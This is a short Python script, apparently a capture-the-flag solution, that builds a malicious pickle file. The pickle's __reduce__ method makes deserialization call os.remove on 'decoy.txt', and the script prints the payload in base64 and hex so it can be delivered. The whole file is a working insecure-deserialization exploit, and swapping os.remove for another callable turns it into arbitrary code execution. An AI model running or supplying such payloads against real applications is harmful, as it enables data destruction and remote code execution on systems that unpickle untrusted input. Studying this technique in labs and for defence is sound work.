import pickle
import os
import base64

# 1. Debug message confirming payload goal
print("[*] Creating malicious pickle payload to delete decoy.txt")
print("[*] When deserialized, this will execute: os.remove('decoy.txt')")
print("[*] This forces the app to fall back to reading flag.txt")

# 2. Create MaliciousPickle class with __reduce__ method
class MaliciousPickle:
    def __reduce__(self):
        # 3. Return callable and arguments for RCE
        # When unpickled, Python will execute: os.remove('decoy.txt')
        return (os.remove, ('decoy.txt',))

# 5. Serialize instance to evil.pickle
print("\n[*] Serializing malicious object to evil.pickle...")
malicious_obj = MaliciousPickle()

# Create the pickle file
with open('evil.pickle', 'wb') as f:
    pickle.dump(malicious_obj, f)

print("[+] Successfully created evil.pickle")

# 6. Show serialized data for verification
print("\n[*] Serialized pickle data (base64):")
with open('evil.pickle', 'rb') as f:
    pickle_data = f.read()
    b64_data = base64.b64encode(pickle_data).decode()
    print(b64_data)

print("\n[*] Serialized pickle data (hex):")
hex_data = pickle_data.hex()
print(hex_data)

# Show raw pickle data summary
